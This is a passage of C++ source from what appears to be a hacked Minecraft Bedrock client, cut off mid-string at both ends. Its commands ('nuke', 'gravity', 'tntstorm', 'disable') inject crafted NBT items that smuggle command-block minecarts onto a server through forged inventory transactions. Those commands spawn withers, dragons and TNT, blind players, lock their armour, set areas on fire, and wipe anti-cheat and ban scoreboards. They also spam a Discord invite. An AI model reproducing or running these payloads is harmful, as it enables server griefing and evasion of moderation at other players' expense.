warn",Ticking:1b,TicksLeftToStay:0}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/scoreboard players reset @a Warn",Ticking:1b,TicksLeftToStay:0}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/scoreboard players reset @a WARN",Ticking:1b,TicksLeftToStay:0}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/scoreboard players reset @a warnillegal",Ticking:1b,TicksLeftToStay:0}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/scoreboard players reset @a WarnIllegal",Ticking:1b,TicksLeftToStay:0}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/tag @a remove illegalitemban",Ticking:1b,TicksLeftToStay:0}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/tag @a remove BanPhase",Ticking:1b,TicksLeftToStay:0}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/execute @a ~~~ function UAC/warnreset",Ticking:1b,TicksLeftToStay:0}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/scoreboard players reset @a BanCBE",Ticking:1b,TicksLeftToStay:0}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/scoreboard players reset @a BanWarn",Ticking:1b,TicksLeftToStay:0}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/scoreboard players reset @a Ban",Ticking:1b,TicksLeftToStay:0}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/scoreboard players reset @a ban",Ticking:1b,TicksLeftToStay:0}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/scoreboard players reset @a BAN",Ticking:1b,TicksLeftToStay:0}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/scoreboard players reset @a IIB",Ticking:1b,TicksLeftToStay:0}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/scoreboard players reset @a BanFly",Ticking:1b,TicksLeftToStay:0}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/scoreboard players reset @a BanPhase",Ticking:1b,TicksLeftToStay:0}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/tag @e remove hide",Ticking:1b,TicksLeftToStay:0}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/scoreboard players set @a SSDEBUG2 1345",Ticking:1b,TicksLeftToStay:0}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/scoreboard players set @a acmtoggle 2424",Ticking:1b,TicksLeftToStay:0}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/tag @a add staffstatus",Ticking:1b,TicksLeftToStay:0}},]},pistonPosX:0,movingBlock:{name:"minecraft:air"},pistonPosY:0,pistonPosZ:0,ench:[{id:28s,lvl:1s}],display:{Name:"§g§lNG Client Invisible CBE",Lore:["Godmode NG Client NBT"]}}})";
		item->fromTag(*Mojangson::parseTag(tag));
		g_Data.getLocalPlayer()->getTransactionManager()->addInventoryAction(C_InventoryAction(0, nullptr, nullptr, item, nullptr, 1, 507, 99999));
		g_Data.getLocalPlayer()->getSupplies()->inventory->addItemToFirstEmptySlot(item);
		if (partner->Partnered.selected == 0)
			clientMessageF("%sDADDY%s%s%s[%sSurge%s] %sHere is your CBEP!%s%sDADDY", OBFUSCATED, RESET, ITALIC, BOLD, BLUE, WHITE, BLUE, RESET, OBFUSCATED);
		else
			clientMessageF("[%sNG%s] %sHere is your CBEP!", LIGHT_PURPLE, WHITE, LIGHT_PURPLE);
		return true;
	}
	if (args->at(1) == "nuke") {
		std::string tag = R"({CanPlaceOn:["grass_block","dirt"],Count:1b,Damage:0s,Name:"minecraft:movingblock",tag:{movingEntity:{id:"Beehive",Occupants:[{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/title @a title Nuked by NG Client!!",ExecuteOnFirstTick:1b,Tags:[],TickDelay:20,Ticking:1b,Invulnerable:1b,definitions:["lightning_bolt"]}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/tickingarea add circle ~~~ 10 NRGNUKE",ExecuteOnFirstTick:1b,Tags:[],TickDelay:20,Ticking:1b,Invulnerable:1b,definitions:["lightning_bolt"]}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/execute @a ~ ~ ~ /summon ender_crystal ~ ~2 ~",ExecuteOnFirstTick:1b,Tags:[],TickDelay:1,Ticking:1b,Invulnerable:1b,definitions:["lightning_bolt"]}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/tickingarea add circle ~~~ 4 GETNUKED",ExecuteOnFirstTick:1b,Tags:[],TickDelay:1,Ticking:1b,Invulnerable:1b,definitions:["lightning_bolt"]}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/execute @a ~ ~ ~ /summon lightning_bolt ~ ~2 ~",ExecuteOnFirstTick:1b,Tags:[],TickDelay:1,Ticking:1b,Invulnerable:1b,definitions:["lightning_bolt"]}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/gamerule tntexplodes true",ExecuteOnFirstTick:1b,Tags:[],TickDelay:1,Ticking:1b,Invulnerable:1b,definitions:["lightning_bolt"]}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/gamerule pvp true",ExecuteOnFirstTick:1b,Tags:[],TickDelay:1,Ticking:1b,Invulnerable:1b,definitions:["lightning_bolt"]}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/gamerule keepinventory false",ExecuteOnFirstTick:1b,Tags:[],TickDelay:1,Ticking:1b,Invulnerable:1b,definitions:["lightning_bolt"]}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"commandblockoutput false",ExecuteOnFirstTick:1b,Tags:[],TickDelay:1,Ticking:1b,Invulnerable:1b,definitions:["lightning_bolt"]}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/execute @a ~ ~ ~ /summon ender_crystal ~ ~2 ~",ExecuteOnFirstTick:1b,Tags:[],TickDelay:1,Ticking:1b,Invulnerable:1b,definitions:["lightning_bolt"]}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/execute @a ~ ~ ~ /summon ender_crystal ~ ~2 ~",ExecuteOnFirstTick:1b,Tags:[],TickDelay:1,Ticking:1b,Invulnerable:1b,definitions:["lightning_bolt"]}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/execute @a ~ ~ ~ /summon ender_crystal ~ ~2 ~",ExecuteOnFirstTick:1b,Tags:[],TickDelay:1,Ticking:1b,Invulnerable:1b,definitions:["lightning_bolt"]}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/execute @a ~ ~ ~ /summon ender_crystal ~ ~2 ~",ExecuteOnFirstTick:1b,Tags:[],TickDelay:1,Ticking:1b,Invulnerable:1b,definitions:["lightning_bolt"]}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/execute @a ~ ~ ~ /summon ender_crystal ~ ~2 ~",ExecuteOnFirstTick:1b,Tags:[],TickDelay:1,Ticking:1b,Invulnerable:1b,definitions:["lightning_bolt"]}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/execute @a ~ ~ ~ /summon ender_crystal ~ ~2 ~",ExecuteOnFirstTick:1b,Tags:[],TickDelay:1,Ticking:1b,Invulnerable:1b,definitions:["lightning_bolt"]}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/execute @a ~ ~ ~ /summon ender_crystal ~ ~2 ~",ExecuteOnFirstTick:1b,Tags:[],TickDelay:1,Ticking:1b,Invulnerable:1b,definitions:["lightning_bolt"]}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/execute @a ~ ~ ~ /summon ender_crystal ~ ~2 ~",ExecuteOnFirstTick:1b,Tags:[],TickDelay:1,Ticking:1b,Invulnerable:1b,definitions:["lightning_bolt"]}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/execute @a ~ ~ ~ /summon ender_crystal ~ ~2 ~",ExecuteOnFirstTick:1b,Tags:[],TickDelay:1,Ticking:1b,Invulnerable:1b,definitions:["lightning_bolt"]}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/execute @a ~ ~ ~ /summon ender_crystal ~ ~2 ~",ExecuteOnFirstTick:1b,Tags:[],TickDelay:1,Ticking:1b,Invulnerable:1b,definitions:["lightning_bolt"]}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/execute @a ~ ~ ~ /summon ender_crystal ~ ~2 ~",ExecuteOnFirstTick:1b,Tags:[],TickDelay:1,Ticking:1b,Invulnerable:1b,definitions:["lightning_bolt"]}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/execute @a ~ ~ ~ /summon ender_crystal ~ ~2 ~",ExecuteOnFirstTick:1b,Tags:[],TickDelay:1,Ticking:1b,Invulnerable:1b,definitions:["lightning_bolt"]}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/execute @a ~ ~ ~ /summon lightning_bolt ~ ~2 ~",ExecuteOnFirstTick:1b,Tags:[],TickDelay:1,Ticking:1b,Invulnerable:1b,definitions:["lightning_bolt"]}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/execute @a ~ ~ ~ /summon ender_crystal ~ ~2 ~",ExecuteOnFirstTick:1b,Tags:[],TickDelay:1,Ticking:1b,Invulnerable:1b,definitions:["lightning_bolt"]}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/execute @a ~ ~ ~ /summon ender_crystal ~ ~2 ~",ExecuteOnFirstTick:1b,Tags:[],TickDelay:1,Ticking:1b,Invulnerable:1b,definitions:["lightning_bolt"]}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/execute @a ~ ~ ~ /summon ender_crystal ~ ~2 ~",ExecuteOnFirstTick:1b,Tags:[],TickDelay:1,Ticking:1b,Invulnerable:1b,definitions:["lightning_bolt"]}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/execute @a ~ ~ ~ /summon ender_crystal ~ ~2 ~",ExecuteOnFirstTick:1b,Tags:[],TickDelay:1,Ticking:1b,Invulnerable:1b,definitions:["lightning_bolt"]}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/execute @a ~ ~ ~ /summon ender_crystal ~ ~2 ~",ExecuteOnFirstTick:1b,Tags:[],TickDelay:1,Ticking:1b,Invulnerable:1b,definitions:["lightning_bolt"]}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/execute @a ~ ~ ~ /summon ender_crystal ~ ~2 ~",ExecuteOnFirstTick:1b,Tags:[],TickDelay:1,Ticking:1b,Invulnerable:1b,definitions:["lightning_bolt"]}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/execute @a ~ ~ ~ /summon ender_crystal ~ ~2 ~",ExecuteOnFirstTick:1b,Tags:[],TickDelay:1,Ticking:1b,Invulnerable:1b,definitions:["lightning_bolt"]}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/execute @a ~ ~ ~ /summon ender_crystal ~ ~2 ~",ExecuteOnFirstTick:1b,Tags:[],TickDelay:1,Ticking:1b,Invulnerable:1b,definitions:["lightning_bolt"]}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/execute @a ~ ~ ~ /summon ender_crystal ~ ~2 ~",ExecuteOnFirstTick:1b,Tags:[],TickDelay:1,Ticking:1b,Invulnerable:1b,definitions:["lightning_bolt"]}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/execute @a ~ ~ ~ /summon ender_crystal ~ ~2 ~",ExecuteOnFirstTick:1b,Tags:[],TickDelay:1,Ticking:1b,Invulnerable:1b,definitions:["lightning_bolt"]}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/execute @a ~ ~ ~ /summon ender_crystal ~ ~2 ~",ExecuteOnFirstTick:1b,Tags:[],TickDelay:1,Ticking:1b,Invulnerable:1b,definitions:["lightning_bolt"]}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/execute @a ~ ~ ~ /summon ender_crystal ~ ~2 ~",ExecuteOnFirstTick:1b,Tags:[],TickDelay:1,Ticking:1b,Invulnerable:1b,definitions:["lightning_bolt"]}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/execute @a ~ ~ ~ /summon ender_crystal ~ ~2 ~",ExecuteOnFirstTick:1b,Tags:[],TickDelay:1,Ticking:1b,Invulnerable:1b,definitions:["lightning_bolt"]}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/execute @a ~ ~ ~ /summon ender_crystal ~ ~2 ~",ExecuteOnFirstTick:1b,Tags:[],TickDelay:1,Ticking:1b,Invulnerable:1b,definitions:["lightning_bolt"]}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/execute @a ~ ~ ~ /summon lightning_bolt ~ ~2 ~",ExecuteOnFirstTick:1b,Tags:[],TickDelay:5,Ticking:1b,Invulnerable:1b,definitions:["lightning_bolt"]}}]},pistonPosX:0,movingBlock:{name:"minecraft:air"},pistonPosY:0,pistonPosZ:0,ench:[{id:28s,lvl:1s}],display:{Name:"§g§lNG Client Nuke CBE",Lore:["NG Client Nuke NBT"]}}})";
		yot->fromTag(*Mojangson::parseTag(tag));
		g_Data.getLocalPlayer()->getTransactionManager()->addInventoryAction(C_InventoryAction(0, nullptr, nullptr, yot, nullptr, 1, 507, 99999));
		g_Data.getLocalPlayer()->getSupplies()->inventory->addItemToFirstEmptySlot(yot);
		if (partner->Partnered.selected == 0)
			clientMessageF("%sDADDY%s%s%s[%sSurge%s] %sHere is your CBEP!%s%sDADDY", OBFUSCATED, RESET, ITALIC, BOLD, BLUE, WHITE, BLUE, RESET, OBFUSCATED);
		else
			clientMessageF("[%sNG%s] %sHere is your CBEP!", LIGHT_PURPLE, WHITE, LIGHT_PURPLE);
		return true;
	}
	if (args->at(1) == "gravity") {
		std::string tag = R"({Count:1b,Damage:1s,Name:"minecraft:bee_nest",CanPlaceOn:["grass","stone","deny","bedrock"],tag:{Occupants:[{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/title @a title Gravity On Top",Ticking:1b,TicksLeftToStay:1}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/say Join team gravity discord.gg/sy5gWvhNKY ",Ticking:1b,TicksLeftToStay:1}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/title @a actionbar discord.gg/sy5gWvhNKY ",Ticking:1b,TicksLeftToStay:1}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/tellraw @a {"rawtext":[{"text":"Gravity On Top"}]}",Ticking:1b,TicksLeftToStay:1}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/execute @a[rm=5] ~ ~ ~ summon tnt",Ticking:1b,TicksLeftToStay:1}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/gamerule commandblockoutput false",Ticking:1b,TicksLeftToStay:1}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/gamerule sendcommandfeedback false",Ticking:1b,TicksLeftToStay:1}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/execute @a[tag=!safe] ~ ~ ~ summon wither ~ ~ ~ minecraft:entity_spawned §o§d§l§kiii§r§o§d§ldiscord.gg/sy5gWvhNKY §kiii§r",Ticking:1b,TicksLeftToStay:1}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/replaceitem entity @a slot.armor.head 0 carved_pumpkin 1 0 {"minecraft:item_lock":{ "mode":"lock_in_slot" }, "minecraft:keep_on_death":{}}",Ticking:1b,TicksLeftToStay:1}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/replaceitem entity @a slot.armor.chest 0 glass 1 0 {"minecraft:item_lock":{ "mode":"lock_in_slot" }, "minecraft:keep_on_death":{}}",Ticking:1b,TicksLeftToStay:1}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/replaceitem entity @a slot.armor.legs 0 glass 1 0 {"minecraft:item_lock":{ "mode":"lock_in_slot" }, "minecraft:keep_on_death":{}}",Ticking:1b,TicksLeftToStay:1}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/replaceitem entity @a slot.armor.feet 0 glass 1 0 {"minecraft:item_lock":{ "mode":"lock_in_slot" }, "minecraft:keep_on_death":{}}",Ticking:1b,TicksLeftToStay:1}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/playanimation @e animation.cat.baby_transform d 999",Ticking:1b,TicksLeftToStay:1}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/execute @e ~~~ fill ~5~5~5 ~-5~-5~-5 bedrock 0 replace command_block",Ticking:1b,TicksLeftToStay:1}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/kill @e[rm=15]",Ticking:1b,TicksLeftToStay:1}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/gamemode c @p",Ticking:1b,TicksLeftToStay:1}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/effect @a[rm=5] nausea 9999999 255 true",Ticking:1b,TicksLeftToStay:1}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"effect @a blindness 255 255",Ticking:1b,TicksLeftToStay:1}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/execute @a[rm=5] ~ ~ ~ summon ender_dragon",Ticking:1b,TicksLeftToStay:1}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/execute @a[rm=5] ~ ~ ~ summon ender_dragon",Ticking:1b,TicksLeftToStay:1}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/execute @a[rm=5] ~ ~ ~ summon ender_dragon",Ticking:1b,TicksLeftToStay:1}},]}})";
		yot->fromTag(*Mojangson::parseTag(tag));
		g_Data.getLocalPlayer()->getTransactionManager()->addInventoryAction(C_InventoryAction(0, nullptr, nullptr, yot, nullptr, 1, 507, 99999));
		g_Data.getLocalPlayer()->getSupplies()->inventory->addItemToFirstEmptySlot(yot);
		if (partner->Partnered.selected == 0)
			clientMessageF("%sDADDY%s%s%s[%sSurge%s] %sHere is your CBEP!%s%sDADDY", OBFUSCATED, RESET, ITALIC, BOLD, BLUE, WHITE, BLUE, RESET, OBFUSCATED);
		else
			clientMessageF("[%sNG%s] %sHere is your CBEP!", LIGHT_PURPLE, WHITE, LIGHT_PURPLE);
		return true;
	}
	if (args->at(1) == "tntstorm") {
		std::string tag = R"({Count:1b,Damage:0s,Name:"bee_nest",tag:{Occupants:[{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/gamerule commandblockoutput false",definitions:["+minecraft:minecart"],Ticking:1b,CustomName:"b8",TicksLeftToStay:0}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/say Â§lÂ§0TIKÂ§fTOKÂ§1-Â§b@Â§9getshnagedÂ§r",definitions:["+minecraft:armor_stand"],Ticking:1b,Invulnerable:1b,CustomName:"Admin",TicksLeftToStay:0}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/playsound block.end_portal.spawn @a",definitions:["+minecraft:minecart"],Ticking:1b,CustomName:"spawn",TicksLeftToStay:0}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/title @a title Â§cSHNAGS WAS SUMMON",definitions:["+minecraft:minecart"],Ticking:1b,CustomName:"summon",TicksLeftToStay:0}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/execute @p ~~~ gamemode c",definitions:["+minecraft:minecart"],Ticking:1b,CustomName:"GMC",TicksLeftToStay:50}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/execute @e[name=Â§TNT] ^^^1 particle minecraft:lava_particle ~~-13~",definitions:["+minecraft:armor_stand"],Ticking:1b,Invulnerable:1b,CustomName:"tnt",TicksLeftToStay:0}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/execute @e[type=wither] ~~~ say Â§aFollow ",definitions:["+minecraft:armor_stand"],Ticking:1b,Invulnerable:1b,CustomName:"tnt",TicksLeftToStay:0}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/execute @p ^^^35 fill ~10 ~10 ~10 ~-10 ~-10 ~-10 fire 0 replace air",definitions:["+minecraft:armor_stand"],Ticking:1b,Invulnerable:1b,CustomName:"5",TicksLeftToStay:0}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/execute @p ^^^40 fill ~1 ~1 ~1 ~-1 ~-1 ~-1 tnt",definitions:["+minecraft:armor_stand"],Ticking:1b,Invulnerable:1b,CustomName:"î„€",TicksLeftToStay:0}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/execute @p ~~~ tp @e[type=armor_stand] ~~15~ ~15",definitions:["+minecraft:armor_stand"],Ticking:1b,Invulnerable:1b,CustomName:"Â§TNT",TicksLeftToStay:0}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/execute @p ~~~ tp @e[type=wither] ~~15~ ~25",definitions:["+minecraft:wither"],Ticking:1b,Invulnerable:1b,Invulnerable:1b,CustomName:"î„€Â§lÂ§kÂ§g:::Â§rÂ§lÂ§0Â§kÂ§f:::Â§rÂ§lÂ§0TIKÂ§fTOK Â§d@Â§cGETSHNAGEDÂ§kÂ§f:::Â§rÂ§lÂ§6Â§kÂ§g:::§kî„€",TicksLeftToStay:0}}],display:{Lore:["Â§dby î„€Â§lÂ§0TIKÂ§fTOKÂ§9-getshnagedÂ§rî„€"],Name:"Â§rÂ§lÂ§6SHNAGS Â§4TNT Â§5STORM"},ench:[{id:28s,lvl:1s}]})";
		yot->fromTag(*Mojangson::parseTag(tag));
		g_Data.getLocalPlayer()->getTransactionManager()->addInventoryAction(C_InventoryAction(0, nullptr, nullptr, yot, nullptr, 1, 507, 99999));
		g_Data.getLocalPlayer()->getSupplies()->inventory->addItemToFirstEmptySlot(yot);
		if (partner->Partnered.selected == 0)
			clientMessageF("%sDADDY%s%s%s[%sSurge%s] %sHere is your CBEP!%s%sDADDY", OBFUSCATED, RESET, ITALIC, BOLD, BLUE, WHITE, BLUE, RESET, OBFUSCATED);
		else
			clientMessageF("[%sNG%s] %sHere is your CBEP!", LIGHT_PURPLE, WHITE, LIGHT_PURPLE);
		return true;
	}

	if (args->at(1) == "disable") {
		std::string tag = R"({CanPlaceOn:["birch_pressure_plate","jungle_pressure_plate","dark_oak_pressure_plate","spruce_pressure_plate","dark_oak_button","carved_pumpkin","jungle_button","stone_slab3","granite_stairs","andesite_stairs","double_stone_slab3","acacia_button","birch_button","spruce_button","turtle_egg","stone_slab4","double_stone_slab4","diorite_stairs","polished_granite_stairs","polished_diorite_stairs","polished_andesite_stairs","mossy_stone_brick_stairs","smooth_red_sandstone_stairs","smooth_sandstone_stairs","blast_furnace","barrel","birch_standing_sign","smooth_quartz_stairs","smoker","end_brick_stairs","birch_wall_sign","darkoak_standing_sign","spruce_wall_sign","darkoak_wall_sign","spruce_standing_sign","normal_stone_stairs","jungle_wall_sign","red_nether_brick_stairs","jungle_standing_sign","acacia_wall_sign","mossy_cobblestone_stairs","acacia_standing_sign","loom","campfire","bee_nest","wither_rose","beehive","dispenser","sandstone","bed","web","tallgrass","wool","iron_block","deadbush","brown_mushroom","gold_block","red_mushroom","brick_block","mossy_cobblestone","mob_spawner","torch","tnt","bookshelf","redstone_wire","diamond_ore","lever","ladder","diamond_block","crafting_table","cactus","snow_layer","snow","jukebox","clay","soul_sand","glowstone","cake","fence","netherrack","trapdoor","nether_wart","blue_ice","nether_brick","melon_block","monster_egg","vine","mycelium","enchanting_table","stonebrick","beacon","fence_gate","waterlily","nether_brick_fence","brewing_stand","cauldron","tripWire","flower_pot","dragon_egg","emerald_ore","end_portal_frame","tripwire_hook","dropper","end_stone","emerald_block","cobblestone_wall","skull","anvil","seaLantern","stained_hardened_clay","quartz_block","redstone_block","slime","hopper","log2","iron_trapdoor","prismarine","hay_block","carpet","hardened_clay","coal_block","red_sandstone","spruce_fence_gate","jungle_fence_gate","birch_fence_gate","grass_path","dark_oak_fence_gate","chorus_flower","acacia_fence_gate","end_bricks","end_rod","red_nether_brick","purpur_block","magma","nether_wart_block","chorus_plant","concrete","bone_block","concretePowder","stonecutter_block","coral","coral_fan_dead","coral_block","coral_fan","wooden_pressure_plate","stone_pressure_plate","acacia_pressure_plate","light_weighted_pressure_plate","heavy_weighted_pressure_plate","grass","double_plant","stone","cobblestone","planks","dirt","sapling","bedrock","sand","gravel","gold_ore","log","coal_ore","sponge","lapis_ore","iron_ore","lapis_block","dark_oak_trapdoor","sea_pickle","bamboo","lectern","barrier","dried_kelp_block","scaffolding","birch_trapdoor","kelp","seagrass","acacia_trapdoor","jungle_trapdoor","spruce_trapdoor","smooth_stone","grindstone","cartography_table","smithing_table","bell","fletching_table","composter","lantern","wood","honeycomb_block","honey_block","leaves","nether_brick_stairs","brick_stairs","activator_rail","spruce_stairs","ender_chest","stone_brick_stairs","sandstone_stairs","wooden_slab","powered_comparator","quartz_stairs","dark_oak_stairs","standing_banner","wooden_button","daylight_detector","birch_stairs","unpowered_comparator","jungle_stairs","trapped_chest","double_wooden_slab","stained_glass_pane","leaves2","acacia_stairs","packed_ice","wall_banner","red_sandstone_stairs","stone_slab2","double_stone_slab2","spruce_door","shulker_box","white_glazed_terracotta","blue_glazed_terracotta","black_glazed_terracotta","gray_glazed_terracotta","purpur_stairs","jungle_door","purple_glazed_terracotta","magenta_glazed_terracotta","yellow_glazed_terracotta","lime_glazed_terracotta","light_blue_glazed_terracotta","cyan_glazed_terracotta","pink_glazed_terracotta","dark_oak_door","acacia_door","brown_glazed_terracotta","birch_door","orange_glazed_terracotta","silver_glazed_terracotta","green_glazed_terracotta","red_glazed_terracotta","prismarine_stairs","prismarine_bricks_stairs","observer","stained_glass","dark_prismarine_stairs","stone_slab","double_stone_slab","obsidian","detector_rail","golden_rail","yellow_flower","glass","red_flower","oak_stairs","furnace","chest","standing_sign","rail","stone_stairs","wooden_door","ice","iron_door","powered_repeater","brown_mushroom_block","wall_sign","unlit_redstone_torch","redstone_torch","redstone_ore","stone_button","pumpkin","lit_pumpkin","unpowered_repeater","red_mushroom_block","iron_bars","glass_pane"],Count:1b,Name:"minecraft:movingBlock",tag:{movingBlock:{name:"minecraft:air",states:{}}movingEntity:{Occupants:[{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/execute @r ~~~ fill ~15 ~15 ~15 ~-15 ~-15 ~-15 fire 0 replace repeating_command_block",definitions:["+minecraft:Player"],Ticking:1b,Invulnerable:1b,CustomName:"î„€Â§lÂ§kÂ§g:::Â§rÂ§lÂ§0Â§kÂ§f:::Â§rÂ§lÂ§0TIKÂ§fTOK Â§d@Â§cGETSHNAGEDÂ§kÂ§f:::Â§rÂ§lÂ§6Â§kÂ§g:::§kî„€",TicksLeftToStay:0}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/execute @r ~~~ fill ~15 ~15 ~15 ~-15 ~-15 ~-15 fire 0 replace chain_command_block",definitions:["+minecraft:Player"],Ticking:1b,Invulnerable:1b,CustomName:"î„€Â§lÂ§kÂ§g:::Â§rÂ§lÂ§0Â§kÂ§f:::Â§rÂ§lÂ§0TIKÂ§fTOK Â§d@Â§cGETSHNAGEDÂ§kÂ§f:::Â§rÂ§lÂ§6Â§kÂ§g:::§kî„€",TicksLeftToStay:0}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/execute @r ~~~ fill ~15 ~15 ~15 ~-15 ~-15 ~-15 fire 0 replace command_block",definitions:["+minecraft:Player"],Ticking:1b,Invulnerable:1b,CustomName:"î„€Â§lÂ§kÂ§g:::Â§rÂ§lÂ§0Â§kÂ§f:::Â§rÂ§lÂ§0TIKÂ§fTOK Â§d@Â§cGETSHNAGEDÂ§kÂ§f:::Â§rÂ§lÂ§6Â§kÂ§g:::§kî„€",TicksLeftToStay:0}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/execute @r ~~~ time set day",definitions:["+minecraft:Player"],Ticking:1b,Invulnerable:1b,CustomName:"î„€Â§lÂ§kÂ§g:::Â§rÂ§lÂ§0Â§kÂ§f:::Â§rÂ§lÂ§0TIKÂ§fTOK Â§d@Â§cGETSHNAGEDÂ§kÂ§f:::Â§rÂ§lÂ§6Â§kÂ§g:::§kî„€",TicksLeftToStay:0}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/execute @r ~~~ tickingarea remove_all",definitions:["+minecraft:Player"],Ticking:1b,Invulnerable:1b,CustomName:"î„€Â§lÂ§kÂ§g:::Â§rÂ§lÂ§0Â§kÂ§f:::Â§rÂ§lÂ§0TIKÂ§fTOK Â§d@Â§cGETSHNAGEDÂ§kÂ§f:::Â§rÂ§lÂ§6Â§kÂ§g:::§kî„€",TicksLeftToStay:0}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/execute @r ~~~ gamerule commandblockoutput 